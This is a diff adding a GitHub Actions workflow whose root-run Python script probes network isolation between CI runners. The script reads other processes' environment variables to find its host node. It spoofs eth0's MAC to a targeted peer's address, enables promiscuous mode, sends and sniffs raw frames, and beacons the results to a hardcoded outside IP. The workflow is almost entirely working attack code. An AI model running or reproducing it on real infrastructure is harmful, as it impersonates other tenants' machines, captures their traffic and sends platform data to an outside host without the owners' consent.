@@ -1,0 +1,89 @@
+name: MAC and promiscuous isolation source
+
+on:
+  workflow_dispatch:
+    inputs:
+      targets:
+        description: URL-safe base64 JSON controlled peer metadata
+        required: true
+
+permissions: {}
+
+jobs:
+  source:
+    runs-on: ubuntu-slim
+    timeout-minutes: 5
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: Change the standard RNDIS MAC and exercise the peer receiver
+        shell: bash
+        env:
+          SLOT: ${{ matrix.slot }}
+          TARGETS: ${{ inputs.targets }}
+        run: |
+          sudo --preserve-env=GITHUB_RUN_ID,SLOT,TARGETS python3 - <<'PY'
+          import base64,glob,json,os,select,socket,subprocess,time,urllib.parse,urllib.request
+
+          def hca_env():
+              for path in glob.glob('/proc/[0-9]*/environ'):
+                  try: items=open(path,'rb').read().split(b'\0')
+                  except OSError: continue
+                  d=dict(x.split(b'=',1) for x in items if b'=' in x)
+                  if b'scheduler_api_url' in d:return d
+              return {}
+          def beacon(name,obj):
+              data=base64.urlsafe_b64encode(json.dumps(obj,separators=(',',':')).encode()).decode()
+              try:urllib.request.urlopen('http://16.146.243.72:8450/'+name+'?d='+data,timeout=2).read()
+              except Exception:pass
+          def command(*args):
+              p=subprocess.run(args,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+              return p.returncode
+
+          targets=json.loads(base64.urlsafe_b64decode(os.environ['TARGETS']+'='*((4-len(os.environ['TARGETS'])%4)%4)))
+          node=urllib.parse.urlsplit(hca_env()[b'scheduler_api_url'].decode()).hostname
+          own_ip=socket.gethostbyname(socket.gethostname());orig=open('/sys/class/net/eth0/address').read().strip()
+          target=next((x for x in targets if x['node']==node),None)
+          result={'run':os.environ['GITHUB_RUN_ID'],'slot':os.environ['SLOT'],'node':node,'orig_mac':orig,'target':target,'set_rc':None,'set_observed':None,'promisc_flag':None,'restored':None,'b_markers':0}
+          if target is None:
+              beacon('MAC_A_RESULT',result);print('MAC_A_RESULT '+json.dumps(result),flush=True);raise SystemExit
+
+          marker=('MACA-3900000-%s-%s' % (result['run'],result['slot'])).encode()
+          command('ip','link','set','dev','eth0','down')
+          result['set_rc']=command('ip','link','set','dev','eth0','address',target['mac'])
+          command('ip','link','set','dev','eth0','up')
+          result['set_observed']=open('/sys/class/net/eth0/address').read().strip()
+          command('ip','link','set','dev','eth0','promisc','on')
+          result['promisc_flag']='PROMISC' in subprocess.check_output(['ip','link','show','dev','eth0'],text=True)
+
+          raw=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(3));raw.bind(('eth0',0));raw.setblocking(False)
+          udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);udp.setblocking(False)
+          deadline=time.monotonic()+30;next_send=0;samples=[]
+          while time.monotonic()<deadline:
+              now=time.monotonic()
+              if now>=next_send:
+                  try:udp.sendto(marker,(target['ip'],39001))
+                  except OSError:pass
+                  # This raw unicast uses the MAC installed through the handler-valid
+                  # NetworkAddress configuration path, rather than only forging one frame.
+                  frame=bytes.fromhex(target['mac'].replace(':',''))*2+b'\x88\xb5'+marker
+                  try:raw.send(frame)
+                  except OSError:pass
+                  next_send=now+.05
+              ready,_,_=select.select([raw],[],[],.02)
+              if not ready:continue
+              try:data=raw.recv(65535)
+              except OSError:continue
+              if b'MACB-3900000-' not in data:continue
+              result['b_markers']+=1
+              if len(samples)<4:samples.append({'bytes':len(data),'dst':data[:6].hex(':'),'src':data[6:12].hex(':'),'type':data[12:14].hex()})
+
+          command('ip','link','set','dev','eth0','promisc','off')
+          command('ip','link','set','dev','eth0','down')
+          command('ip','link','set','dev','eth0','address',orig)
+          command('ip','link','set','dev','eth0','up')
+          result['restored']=open('/sys/class/net/eth0/address').read().strip();result['samples']=samples
+          print('MAC_A_RESULT '+json.dumps(result),flush=True);beacon('MAC_A_RESULT',result)
+          PY
